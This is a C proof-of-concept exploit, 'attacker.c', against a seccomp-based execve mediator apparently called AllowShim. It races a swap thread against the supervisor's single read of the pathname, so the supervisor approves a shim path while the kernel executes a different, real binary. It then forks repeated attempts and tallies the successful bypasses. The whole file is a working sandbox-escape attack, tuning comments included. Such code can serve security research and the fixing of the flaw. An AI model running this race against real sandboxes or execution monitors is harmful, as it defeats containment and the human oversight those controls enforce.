/*
 * attacker.c — AllowShim TOCTOU bypass POC
 *
 * The supervisor classifies execve/execveat traps into three buckets.
 * When the resolved path starts with shim_dir it responds CONTINUE without
 * performing a TOCTOU double-read.  The kernel then re-reads the pathname
 * from user memory *after* the response.  A sibling thread that swaps the
 * buffer between the shim path and the real binary path can arrange for:
 *
 *   supervisor reads: shim path  → CONTINUE (no re-read)
 *   kernel re-reads:  direct path → execs real binary directly  ← BYPASS
 *
 * Usage:
 *   attacker <shim_path> <direct_path> <num_forks>
 *
 * Each of <num_forks> children spawns a swap thread and then calls execve.
 * The parent captures child stdout via pipe and reports how many produced
 * "REAL_BINARY_RAN" (bypass) versus "MEDIATED_RESPONSE" (shim) or EACCES
 * (denied).
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <fcntl.h>
#include <time.h>

#define MAX_PATH 4096

/* Shared buffer that execve(buf, ...) reads — and the kernel re-reads. */
static char g_buf[MAX_PATH];

struct swap_args {
    char shim_path[MAX_PATH];
    char direct_path[MAX_PATH];
    volatile int stop;
};

/*
 * Swap thread strategy: hold shim_path for a longer phase (so the supervisor
 * is likely to read the shim path and emit CONTINUE), then briefly switch to
 * direct_path (hoping to land inside the kernel's post-CONTINUE re-read
 * window).  Cycle continuously until the stop flag is set.
 *
 * The inner spin loops are tuned to produce roughly the right interval on a
 * modern ARM64/x86-64 with a local seccomp supervisor.  Adjust HOLD_ITERS and
 * SWAP_ITERS if you need to tune.
 */
static void *swap_thread(void *arg) {
    struct swap_args *a = arg;
    size_t shim_len   = strlen(a->shim_path)   + 1;
    size_t direct_len = strlen(a->direct_path) + 1;

    /*
     * Pad both paths to the same length so a partial memcpy never leaves a
     * stale NUL at the wrong position.  We zero g_buf first and then ensure
     * each write covers the same region, leaving the correct NUL terminator.
     */
    size_t padded = shim_len > direct_len ? shim_len : direct_len;
    char shim_padded[MAX_PATH];
    char direct_padded[MAX_PATH];
    memset(shim_padded,   0, padded);
    memset(direct_padded, 0, padded);
    memcpy(shim_padded,   a->shim_path,   shim_len);
    memcpy(direct_padded, a->direct_path, direct_len);

    while (!a->stop) {
        /* Phase 1: shim path — long enough for supervisor to read */
        memcpy(g_buf, shim_padded, padded);
        /* spin ~20 000 iterations ≈ 10–50 μs depending on CPU */
        for (volatile int i = 0; i < 20000; i++) {}

        /* Phase 2: direct path — brief window targeting kernel's re-read */
        memcpy(g_buf, direct_padded, padded);
        /* spin ~2 000 iterations ≈ 1–5 μs */
        for (volatile int i = 0; i < 2000; i++) {}
    }
    return NULL;
}

/*
 * Run one attempt in the current process (called after fork).
 * Sets up g_buf, spawns the swap thread, then calls execve.
 * If execve fails, prints a diagnostic and exits.
 */
static void child_attempt(const char *shim_path, const char *direct_path) {
    struct swap_args args;
    memset(&args, 0, sizeof(args));
    strncpy(args.shim_path,   shim_path,   MAX_PATH - 1);
    strncpy(args.direct_path, direct_path, MAX_PATH - 1);
    args.stop = 0;

    /* Start with shim path in the buffer. */
    strncpy(g_buf, shim_path, MAX_PATH - 1);

    pthread_t tid;
    if (pthread_create(&tid, NULL, swap_thread, &args) != 0) {
        perror("pthread_create");
        _exit(3);
    }

    /* Brief pause so the swap thread establishes its rhythm before we trap. */
    struct timespec ts = { .tv_sec = 0, .tv_nsec = 5000 }; /* 5 μs */
    nanosleep(&ts, NULL);

    /*
     * The execve pathname is g_buf — the same memory the swap thread is
     * mutating.  The seccomp supervisor reads this address from
     * /proc/<tid>/mem; the kernel re-reads it after CONTINUE.
     */
    char *child_argv[] = { g_buf, NULL };
    /*
     * Pass a minimal environment so the target script can run.
     * Inherit PATH so /bin/sh can be found by the shebang.
     */
    char *path_env = getenv("PATH");
    char path_buf[MAX_PATH + 8];
    snprintf(path_buf, sizeof(path_buf), "PATH=%s", path_env ? path_env : "/bin:/usr/bin");
    char *child_envp[] = { path_buf, NULL };

    execve(g_buf, child_argv, child_envp);

    /* execve returned — stop the swap thread cleanly. */
    args.stop = 1;
    pthread_join(tid, NULL);

    if (errno == EACCES) {
        /* Filter denied — expected for direct-path attempts without bypass. */
        write(STDOUT_FILENO, "DENIED\n", 7);
        _exit(1);
    }
    if (errno == ENOENT) {
        write(STDOUT_FILENO, "ENOENT\n", 7);
        _exit(2);
    }
    fprintf(stdout, "EXECVE_FAILED errno=%d\n", errno);
    fflush(stdout);
    _exit(4);
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <shim_path> <direct_path> <num_forks>\n", argv[0]);
        return 1;
    }
    const char *shim_path   = argv[1];
    const char *direct_path = argv[2];
    int num_forks = atoi(argv[3]);
    if (num_forks <= 0) num_forks = 100;

    int bypasses  = 0;
    int mediated  = 0;
    int denied    = 0;
    int other     = 0;

    for (int i = 0; i < num_forks; i++) {
        int pipefd[2];
        if (pipe(pipefd) != 0) { perror("pipe"); return 1; }

        pid_t pid = fork();
        if (pid < 0) { perror("fork"); return 1; }

        if (pid == 0) {
            /* Child: redirect stdout into the pipe, run the attempt. */
            close(pipefd[0]);
            dup2(pipefd[1], STDOUT_FILENO);
            close(pipefd[1]);
            child_attempt(shim_path, direct_path);
            _exit(4); /* unreachable */
        }

        /* Parent: read child output. */
        close(pipefd[1]);
        char out[4096];
        memset(out, 0, sizeof(out));
        ssize_t n = 0, total = 0;
        while ((n = read(pipefd[0], out + total,
                         sizeof(out) - 1 - total)) > 0) {
            total += n;
        }
        close(pipefd[0]);

        int status = 0;
        waitpid(pid, &status, 0);

        if (strstr(out, "REAL_BINARY_RAN")) {
            bypasses++;
            fprintf(stderr, "[attempt %3d] BYPASS — real binary ran!\n", i + 1);
        } else if (strstr(out, "MEDIATED_RESPONSE") || strstr(out, "MEDIATED")) {
            mediated++;
        } else if (strstr(out, "DENIED")) {
            denied++;
        } else {
            other++;
            fprintf(stderr, "[attempt %3d] other: status=%d out=%s\n",
                    i + 1, WEXITSTATUS(status), out);
        }
    }

    printf("\n=== Results (%d attempts) ===\n", num_forks);
    printf("  BYPASS (real binary ran): %d\n", bypasses);
    printf("  Mediated (shim ran):      %d\n", mediated);
    printf("  Denied by filter:         %d\n", denied);
    printf("  Other/error:              %d\n", other);

    return bypasses > 0 ? 0 : 1; /* exit 0 = bypass confirmed */
}
